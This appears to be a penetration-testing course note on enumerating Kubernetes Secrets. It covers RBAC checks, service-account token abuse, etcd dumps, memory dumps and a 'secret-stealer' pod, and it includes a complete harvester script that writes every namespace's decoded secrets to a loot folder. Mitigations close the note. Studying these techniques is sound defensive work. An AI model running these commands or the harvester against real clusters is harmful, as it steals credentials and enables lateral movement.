---
tags: [kubernetes, secrets, enumeration, vapt, k8s, pentesting]
difficulty: advanced
module: "38 - Container and Kubernetes Security"
topic: "38.18 K8s Secret Enumeration"
---

# Kubernetes Secret Enumeration

## Introduction
In Kubernetes (K8s), `Secrets` are objects designed to store and manage sensitive information, such as passwords, OAuth tokens, and SSH keys. Putting this information in a Secret is theoretically safer and more flexible than putting it verbatim in a Pod definition or in a container image. However, from a penetration testing and vulnerability assessment perspective, K8s Secrets are notorious for being mishandled, misconfigured, and exposed. 

A critical misunderstanding among developers is that **Kubernetes Secrets are, by default, merely Base64 encoded, NOT encrypted**. Unless Encryption at Rest is explicitly configured by the cluster administrator, anyone with access to the underlying `etcd` datastore or possessing the requisite Role-Based Access Control (RBAC) permissions can easily extract and decode these secrets.

## Core Concepts & Architecture

When a Pod needs to consume a Secret, Kubernetes provides three primary mechanisms:
1. **Environment Variables**: Injected into the container at runtime.
2. **Volume Mounts**: Mounted as files in a `tmpfs` volume.
3. **kubelet Image Pull Secrets**: Used by the kubelet to pull private container images.

### The Secret Flow Diagram

```text
+-----------------------------------------------------------------------------------+
|                                 Kubernetes Cluster                                |
|                                                                                   |
|  +-------------------+        +--------------------+        +------------------+  |
|  |                   |        |                    |        |                  |  |
|  |  etcd Datastore   | <====> |   API Server       | <====> |   kubelet        |  |
|  | (Secrets stored   |        | (RBAC & AuthZ)     |        | (Node Agent)     |  |
|  |  in plaintext or  |        |                    |        |                  |  |
|  |  encrypted at     |        +---------+----------+        +--------+---------+  |
|  |  rest)            |                  |                            |            |
|  +-------------------+                  v                            v            |
|                               +--------------------+        +--------+---------+  |
|                               |  Admin/Attacker    |        |       Pod        |  |
|                               |  (kubectl get      |        | - Env Vars       |  |
|                               |   secrets)         |        | - Volume Mounts  |  |
|                               +--------------------+        +------------------+  |
+-----------------------------------------------------------------------------------+
```

## Vectors for Secret Enumeration

### 1. RBAC Misconfigurations (API Querying)
The most direct way to enumerate secrets is through the Kubernetes API if the compromised Service Account (SA) or user has the `get`, `list`, or `watch` verbs on `secrets` resources.

#### Checking Permissions
First, verify what the current token can do:
```bash
kubectl auth can-i list secrets --namespace=default
kubectl auth can-i get secrets --all-namespaces
```
If you have broad permissions, you can list all secrets in a specific namespace:
```bash
kubectl get secrets -n <namespace>
```
To read a specific secret and view its Base64 encoded payload:
```bash
kubectl get secret <secret-name> -n <namespace> -o yaml
```
Alternatively, extract and decode it in one command using `go-template` or `jsonpath`:
```bash
kubectl get secret <secret-name> -n <namespace> -o jsonpath="{.data.\*}" | base64 -d
```

### 2. Service Account Tokens
Every Pod is automatically provisioned with a Service Account token unless `automountServiceAccountToken: false` is specified in the Pod spec. 
This token is located at:
`/var/run/secrets/kubernetes.io/serviceaccount/token`

This JWT (JSON Web Token) is used to authenticate against the API server.
```bash
# Read the token inside a compromised pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Set up alias for easy API querying from within the pod
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}

# Query the API
curl -s $APISERVER/api/v1/namespaces/default/secrets \
  --header "Authorization: Bearer $TOKEN" \
  --insecure
```

### 3. Environmental Variable Extraction
When secrets are passed as environment variables, any local file inclusion (LFI), server-side request forgery (SSRF) leading to execution, or remote code execution (RCE) can expose them.
```bash
# Print environment variables
env
printenv

# Inspecting process environment variables (Linux procfs)
# If you have root on the node or hostPID access:
cat /proc/1/environ | tr '\0' '\n'
```
*Note: Environment variables are static. If the secret is updated in Kubernetes, the environment variable won't update until the Pod restarts.*

### 4. Mounted Volume Secrets
Secrets mounted as volumes are updated dynamically. They are typically found in `/etc/secrets/` or `/var/run/secrets/`.
```bash
# Search for potential secret mounts
mount | grep tmpfs
find / -name "*secret*" -type d 2>/dev/null
```
If you find a mounted secret directory, simply `cat` the files.

### 5. Extracting Secrets from etcd
If an attacker compromises a control plane node or gains direct access to the `etcd` database (usually listening on port 2379, 2380), they can dump all cluster secrets.
```bash
# Requires etcdctl and client certificates (usually found in /etc/kubernetes/pki/etcd/)
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/ --prefix --keys-only
```
To dump a specific secret from etcd:
```bash
etcdctl ... get /registry/secrets/default/my-secret
```

### 6. Container Memory Dumps (Advanced)
If a secret is removed or masked, but the application has already loaded it into memory, an attacker with `SYS_PTRACE` capabilities or access to the underlying node can dump the process memory to extract the secret.
```bash
# Find target process
ps aux
# Dump memory using gcore (requires gdb installed and privileges)
gcore <PID>
# Search for secret patterns in the core dump
strings core.<PID> | grep -i "password="
```

## Advanced Techniques: Abusing Init Containers & Ephemeral Containers
If an attacker lacks direct read access to secrets but has the ability to create or patch Pods (`create pods`, `patch pods`), they can mount the target secret into a new Pod and read it.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secret-stealer
spec:
  containers:
  - name: stealer
    image: busybox
    command: ["sleep", "3600"]
    volumeMounts:
    - name: stolen-secret
      mountPath: /stolen
  volumes:
  - name: stolen-secret
    secret:
      secretName: target-production-secret
```
Deploy this pod, `exec` into it, and read `/stolen`.

## Defense & Mitigation

1. **Encryption at Rest**: Configure Kubernetes to encrypt secrets in `etcd` using a KMS (Key Management Service) provider (AWS KMS, GCP KMS, HashiCorp Vault).
   ```yaml
   # EncryptionConfiguration example
   apiVersion: apiserver.config.k8s.io/v1
   kind: EncryptionConfiguration
   resources:
     - resources:
         - secrets
       providers:
         - kms:
             name: myKmsPlugin
             endpoint: unix:///tmp/socketfile.sock
         - identity: {}
   ```
2. **RBAC Least Privilege**: Never grant `get` or `list` on `secrets` across all namespaces (`ClusterRole` admin/edit) unless absolutely necessary.
3. **External Secrets Operators (ESO)**: Use tools like HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault, and sync them securely rather than storing raw K8s secrets.
4. **Disable Auto-Mounting**: Set `automountServiceAccountToken: false` on pods that do not need to speak to the K8s API.


## Deep Dive: Enumeration Scripts and Automation
To automate the extraction of secrets across a massive cluster, attackers often deploy custom shell scripts. Below is a deep dive into an automated secret harvesting script used in advanced persistent threat (APT) scenarios.

### Automated Harvesting Script
```bash
#!/bin/bash
# secret_harvester.sh
# Requires jq and a valid service account token with cluster-wide secret read permissions.

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"

echo "[*] Fetching all namespaces..."
NAMESPACES=$(curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$API_SERVER/api/v1/namespaces" | jq -r '.items[].metadata.name')

for NS in $NAMESPACES; do
  echo "[*] Enumerating secrets in namespace: $NS"
  SECRETS=$(curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$API_SERVER/api/v1/namespaces/$NS/secrets" | jq -r '.items[].metadata.name')
  
  for SEC in $SECRETS; do
    echo "  -> Found secret: $SEC"
    # Fetch and decode the secret data
    curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$API_SERVER/api/v1/namespaces/$NS/secrets/$SEC" | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"' > "./loot/${NS}_${SEC}.txt"
  done
done
echo "[*] Harvesting complete. Check the loot directory."
```

### Analyzing `etcd` Key Structure
When accessing `etcd` directly, it is crucial to understand its key-value structure. Kubernetes stores secrets under the `/registry/secrets/<namespace>/<name>` prefix. The value stored is a Protobuf encoded object. 
If you dump `etcd` memory directly (e.g., via a memory scraping attack against the `etcd` process), you will find the Base64 values intertwined with Protobuf metadata.

```text
# Example of raw etcd dump containing a secret
\x00\x00\x00\x1a\x12\x04\x64\x61\x74\x61\x1a\x11\x0a\x08\x70\x61\x73\x73\x77\x6f\x72\x64\x12\x05\x61\x64\x6d\x69\x6e
```
Decoding this Protobuf payload requires knowing the K8s API schema or manually string-searching the binary blob. Tools like `auger` can be used to decode K8s objects directly from `etcd` dumps.

```bash
# Using auger to decode etcd values
auger decode secret <raw_etcd_value.bin>
```

## Chaining Opportunities
- **[[19 - Lateral Movement in K8s]]**: Stolen tokens or secrets can be used to authenticate as higher-privileged entities, enabling lateral movement across nodes or even to cloud providers (if AWS IAM / GCP service account keys are stored in secrets).
- **[[20 - Admission Controller Bypass]]**: Modifying pod specs to mount secrets might be blocked by admission controllers, requiring bypass techniques to successfully execute the secret-stealing pod.
- **[[10 - SSRF and Cloud Metadata]]**: SSRF vulnerabilities in web apps hosted in K8s can be used to query the local service account token if the API server is reachable.

## Related Notes
- [[17 - Kubernetes RBAC Auditing]]
- [[14 - Cloud IAM Privilege Escalation]]
- [[08 - Container Breakouts]]
